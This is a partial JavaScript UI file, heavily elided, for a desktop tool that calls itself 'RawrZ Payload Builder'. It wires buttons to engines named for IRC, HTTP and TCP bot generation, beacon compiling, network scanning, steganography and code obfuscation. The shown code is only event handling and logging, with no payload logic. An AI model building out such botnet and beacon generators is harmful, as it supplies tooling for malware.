...
document.addEventListener('DOMContentLoaded', function () {
  ...
  // File selection with proper error handling
  ...
  if (selectFileBtn) {
    selectFileBtn.addEventListener('click', async () => {
      try {
        ...
        log(`❌ File selection failed: ${error.message}`);
      }
    });
  } else {
    console.warn('selectFile button not found in DOM');
  }
  ...
  if (selectFilesBtn) {
    ...
    console.warn('selectFiles button not found in DOM');
  }
  ...
  document.getElementById('hashBtn')?.addEventListener('click', async () => {
    ...
    try {
      ...
      log(`❌ Hashing error: ${error.message}`);
    }
  });
  ...
  document.getElementById('compressBtn')?.addEventListener('click', async () => {
    ...
    try {
      ...
      log(`❌ Compression error: ${error.message}`);
    }
  });
...
// Load engines button with null check
...
if (loadEnginesBtn) {
  ...
  console.warn('loadEngines button not found');
}

// Enhanced engine handlers with null checks
function setupEngineHandlers() {
  const engineButtons = {
    'ircBotGen': 'irc-bot-generator',
    'httpBotGen': 'http-bot-builder',
    'tcpBotGen': 'tcp-bot-builder',
    'beaconismGen': 'beaconism-compiler',
    'binaryAnalysis': 'binary-analysis',
    'networkScanner': 'network-scanner',
    'steganography': 'steganography',
    'codeObfuscator': 'code-obfuscator'
  };

  for (const [buttonId, engineId] of Object.entries(engineButtons)) {
    const button = document.getElementById(buttonId);
    if (button) {
      button.addEventListener('click', async () => {
        try {
          log(`🚀 Executing ${engineId}...`);
          if (window.engineManager) {
            await window.engineManager.executeEngine(engineId);
          } else {
            log(`❌ ${engineId} failed: Engine manager not available`);
          }
        } catch (error) {
          log(`❌ ${engineId} failed: ${error.message}`);
        }
      });
    } else {
      console.warn(`${buttonId} button not found for engine ${engineId}`);
    }
  }
}
...
function log(message, type = 'info') {
  ...
  // Find all possible console/output elements
  const outputElements = [
    document.getElementById('output'),
    document.getElementById('console01'),
    document.getElementById('console'),
    document.querySelector('.console'),
    document.querySelector('.output-console')
  ].filter(Boolean);
...
function initializeSystemStatus() {
  log('🚀 RawrZ Payload Builder initializing...');

  // Check for required APIs
  const apiStatus = {
    electronAPI: !!window.electronAPI,
    rawrZManifest: !!window.rawrZManifest,
    engineManager: !!window.engineManager,
    fileScanning: !!window.scanFile
  };

  log(`🔍 System Status Check:`);
  Object.entries(apiStatus).forEach(([api, available]) => {
    log(`  ${api}: ${available ? '✅ Available' : '❌ Unavailable'}`);
  });
...
// Run initialization
setTimeout(initializeSystemStatus, 500);
